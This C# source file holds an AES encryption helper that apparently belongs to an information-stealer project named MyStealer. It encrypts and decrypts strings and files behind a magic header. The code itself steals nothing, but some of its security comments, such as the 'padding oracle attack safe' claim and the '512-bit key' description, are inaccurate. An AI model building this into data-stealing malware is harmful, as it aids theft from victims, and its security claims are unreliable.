using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

namespace MyStealer.Shared
{
    public static class MyCrypt
    {
        // visit my repository!
        public static readonly byte[] Magic = new byte[]
        {
            (byte)'g',
            (byte)'i',
            (byte)'t',
            (byte)'h',
            (byte)'u',
            (byte)'b',
            (byte)'.',
            (byte)'c',
            (byte)'o',
            (byte)'m',
            (byte)'/',
            (byte)'h',
            (byte)'s',
            (byte)'h',
            (byte)'e',
            (byte)'r',
            (byte)'i',
            (byte)'c',
            (byte)'0',
            (byte)'2',
            (byte)'1',
            (byte)'0',
            (byte)'/',
            (byte)'M',
            (byte)'y',
            (byte)'S',
            (byte)'t',
            (byte)'e',
            (byte)'a',
            (byte)'l',
            (byte)'e',
            (byte)'r',
        };
        public const int KeyLength = 32; // AES-256
        public const int IvLength = 16;

        public static byte[] GenIv()
        {
            var buffer = new byte[IvLength];
            var rng = RandomNumberGenerator.Create();
            rng.GetBytes(buffer, 0, IvLength);
            return buffer;
        }

        // Return 512-bit hashed encryption key
        public static Aes InitAes(byte[] key, byte[] iv)
        {
            var hash = SHA512.Create();
            var buffer = hash.ComputeHash(key);

            var _key = new byte[KeyLength];
            // hash: <16 bytes (ignored)><32 bytes (key)><16 bytes (ignored)>
            Buffer.BlockCopy(buffer, buffer.Length / 4, _key, 0, KeyLength);

            var aes = Aes.Create();
            aes.Key = _key;
            aes.IV = iv;
            aes.Mode = CipherMode.CFB;
            aes.Padding = PaddingMode.ISO10126; // Padding oracle attack safe

            return aes;
        }

        public static void WriteHeader(Stream stream, byte[] iv)
        {
            stream.Write(Magic, 0, Magic.Length);
            stream.Write(iv, 0, IvLength);
        }

        public static bool ReadHeader(Stream stream, out byte[] iv)
        {
            iv = new byte[IvLength];
            var magicBuffer = new byte[Magic.Length];
            stream.Read(magicBuffer, 0, Magic.Length);
            if (!Magic.SequenceEqual(magicBuffer))
                return false;

            stream.Read(iv, 0, IvLength);
            return true;
        }

        public static string Encrypt(string plain, byte[] key)
        {
            var iv = GenIv();
            using (var aes = InitAes(key, iv))
            using (var outStream = new MemoryStream())
            {
                WriteHeader(outStream, iv);
                using (var crypto = new CryptoStream(outStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                using (var writer = new StreamWriter(crypto))
                    writer.Write(plain);

                return Convert.ToBase64String(outStream.ToArray());
            }
        }

        public static void EncryptToFile(string destFile, Stream stream, byte[] key)
        {
            var iv = GenIv();
            using (var aes = InitAes(key, iv))
            using (var outFile = File.Open(destFile, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                WriteHeader(outFile, iv);
                using (var crypto = new CryptoStream(outFile, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    stream.CopyTo(crypto);
            }
        }

        public static string Decrypt(string encrypted, byte[] key)
        {
            using (var inStream = new MemoryStream(Convert.FromBase64String(encrypted)))
            {
                if (!ReadHeader(inStream, out var iv))
                    throw new InvalidDataException("magic");
                using (var aes = InitAes(key, iv))
                using (var outStream = new MemoryStream())
                {
                    using (var crypto = new CryptoStream(inStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    using (var reader = new StreamReader(crypto))
                        return reader.ReadToEnd();
                }
            }
        }

        public static void DecryptToFile(string destFile, Stream stream, byte[] key)
        {
            if (!ReadHeader(stream, out var iv))
                throw new InvalidDataException("magic");
            using (var aes = InitAes(key, iv))
            using (var crypto = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read))
            using (var outFile = File.Open(destFile, FileMode.Create, FileAccess.Write, FileShare.None))
                crypto.CopyTo(outFile);
        }
    }
}
